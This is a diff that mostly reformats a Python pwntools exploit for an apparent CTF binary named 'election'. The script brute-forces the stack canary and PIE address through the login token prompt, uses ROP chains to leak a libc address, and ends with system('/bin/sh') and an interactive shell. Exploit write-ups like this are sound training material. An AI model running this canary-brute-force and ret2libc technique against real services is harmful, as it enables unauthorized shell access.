@@ -1,14 +1,14 @@
 #!/usr/bin/env python
-from pwn import * 
+from pwn import *
 context.arch = 'amd64'
 
 r = process('./election', env={"LD_PRELOAD": "./libc.so"})
 
 # nc edu-ctf.csie.org 10180
 # r = remote('edu-ctf.csie.org', 10180)
-#pause()
+# pause()
 
-############################### round 1 -----------------------> leak addresses
+# round 1 -----------------------> leak addresses
 
 # leak canary and <libc_csu_init> addr bruteforcely
 aaa = 'a' * 0xb8
@@ -22,7 +22,8 @@ j = 0
 while j < 8:
     for i in range(256):
         r.sendlineafter('>', '1')  # login
-        r.sendthen('Token: ', aaa + ''.join([chr(x) for x in canary_leaker]) + chr(i))
+        r.sendthen('Token: ', aaa + ''.join([chr(x)
+                                             for x in canary_leaker]) + chr(i))
         if 'Invalid' not in r.recvline():
             canary_leaker.append(i)
             # print("j = {}, leaker = {}".format(j, canary_leaker))
@@ -34,7 +35,8 @@ j = 0
 while j < 8:
     for i in range(256):
         r.sendlineafter('>', '1')  # login
-        r.sendthen('Token: ', aaa + ''.join([chr(x) for x in canary_leaker]) + ''.join([chr(x) for x in pie_leaker]) + chr(i))
+        r.sendthen('Token: ', aaa + ''.join([chr(x) for x in canary_leaker]) + ''.join(
+            [chr(x) for x in pie_leaker]) + chr(i))
         if 'Invalid' not in r.recvline():
             pie_leaker.append(i)
             r.sendlineafter('>', '3')  # logout
@@ -58,19 +60,19 @@ ret = base + 0x906
 buf = base + 0x202160
 
 rop = flat(p64(buf + 32),
-         p64(0xdeadbeef),
-         p64(pop_rdi),
-         p64(stack_chk_fail_got),
-         p64(puts_plt),
-         p64(ret),
-         p64(main))
+           p64(0xdeadbeef),
+           p64(pop_rdi),
+           p64(stack_chk_fail_got),
+           p64(puts_plt),
+           p64(ret),
+           p64(main))
 
 # rop = flat(p64(buf + 32),
-         # p64(pop_rdi),
-         # p64(stack_chk_fail_got),
-         # p64(puts_plt),
-         # p64(ret),
-         # p64(main))
+# p64(pop_rdi),
+# p64(stack_chk_fail_got),
+# p64(puts_plt),
+# p64(ret),
+# p64(main))
 
 for j in range(25):
     r.sendlineafter('>', '2')  # register
@@ -83,7 +85,7 @@ for j in range(25):
         r.sendlineafter('>', '1')  # vote
         r.sendlineafter('[0~9]: ', '0')
 
-    r.sendlineafter('>', '3') # logout
+    r.sendlineafter('>', '3')  # logout
 
 r.sendlineafter('>', '2')  # register
 r.sendlineafter('Register an anonymous token: ', rop)
@@ -95,12 +97,12 @@ for i in range(5):
     r.sendlineafter('>', '1')  # vote
     r.sendlineafter('[0~9]: ', '0')
 
-r.sendlineafter('>', '3') # logout
+r.sendlineafter('>', '3')  # logout
 
 r.sendlineafter('>', '1')
 r.sendlineafter('Token: ', rop)
-r.sendlineafter('>', '2') # say something
-r.sendlineafter(': ', '0') # to pusheen
+r.sendlineafter('>', '2')  # say something
+r.sendlineafter(': ', '0')  # to pusheen
 
 # overflow rbp to 0x202230, return address to "leave ret" -> 0xbe9
 pop_pop_pop_pop_ret = base + 0x119c
@@ -113,12 +115,12 @@ payload = flat('b' * offset_from_msg_to_canary,
                )
 
 # payload = flat('b' * offset_from_msg_to_canary,
-               # p64(canary),
-               # p64(buf),
-               # p64(pop_pop_ret)
-               # )
+# p64(canary),
+# p64(buf),
+# p64(pop_pop_ret)
+# )
 
-r.sendlineafter('Message: ', payload) # to pusheen
+r.sendlineafter('Message: ', payload)  # to pusheen
 r.sendlineafter('>', '3')
 
 r.recvuntil('>')
@@ -128,7 +130,7 @@ success("leaked stack_chk_fail@libc: {}".format(hex(stack_chk_fail_libc)))
 libc_base = stack_chk_fail_libc - 0x134c80
 
 
-################################ round 2 ------------> system('/bin/sh')
+# round 2 ------------> system('/bin/sh')
 libc_system = libc_base + 0x4f440
 libc = ELF('./libc.so')
 bin_sh = libc_base + libc.search('/bin/sh').next()
@@ -142,11 +144,11 @@ rop2 = flat(p64(buf + 32),
             p64(main))
 
 # rop2 = flat(p64(buf + 32),
-            # p64(0xdeadbeef),
-            # p64(pop_rdi),
-            # p64(bin_sh),
-            # p64(libc_system)
-            # )
+# p64(0xdeadbeef),
+# p64(pop_rdi),
+# p64(bin_sh),
+# p64(libc_system)
+# )
 
 for j in range(25):
     r.sendlineafter('>', '2')  # register
@@ -159,7 +161,7 @@ for j in range(25):
         r.sendlineafter('>', '1')  # vote
         r.sendlineafter('[0~9]: ', '0')
 
-    r.sendlineafter('>', '3') # logout
+    r.sendlineafter('>', '3')  # logout
 
 r.sendlineafter('>', '2')  # register
 r.sendlineafter('Register an anonymous token: ', rop2)
@@ -172,12 +174,12 @@ for i in range(5):
     r.sendlineafter('>', '1')  # vote
     r.sendlineafter('[0~9]: ', '0')
 
-r.sendlineafter('>', '3') # logout
+r.sendlineafter('>', '3')  # logout
 
 r.sendlineafter('>', '1')
 r.sendlineafter('Token: ', rop2)
-r.sendlineafter('>', '2') # say something
-r.sendlineafter(': ', '0') # to pusheen
+r.sendlineafter('>', '2')  # say something
+r.sendlineafter(': ', '0')  # to pusheen
 
 # overflow rbp to 0x202230, return address to "leave ret" -> 0xbe9
 payload = flat('b' * offset_from_msg_to_canary,
@@ -186,11 +188,6 @@ payload = flat('b' * offset_from_msg_to_canary,
                p64(pop_pop_pop_pop_ret)
                )
 
-r.sendlineafter('Message: ', payload) # to pusheen
-pause()
+r.sendlineafter('Message: ', payload)  # to pusheen
 r.sendlineafter('>', '3')
 r.interactive()
-
-
-
-
